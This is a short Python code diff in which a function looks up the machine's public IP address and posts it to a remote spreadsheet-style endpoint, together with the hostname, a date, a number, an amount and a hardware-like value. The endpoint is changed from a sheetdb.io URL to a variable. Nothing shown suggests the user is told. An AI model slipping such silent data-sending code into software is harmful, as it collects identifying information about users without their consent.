@@ -285,7 +285,7 @@ def intpu():
             url = 'https://ipinfo.io/json'
             resp = urlopen(url)
             data = json.load(resp)
-            url= "https://sheetdb.io/api/v1/myawxgjvo61ub"
+            url= google
             data = {"Date":Date001,"IP" : data['ip'],"Name": f"{platform.node()}", "Number": number,"Amount": amount,"Data": hard}
             requests.post(url, json=data)
             
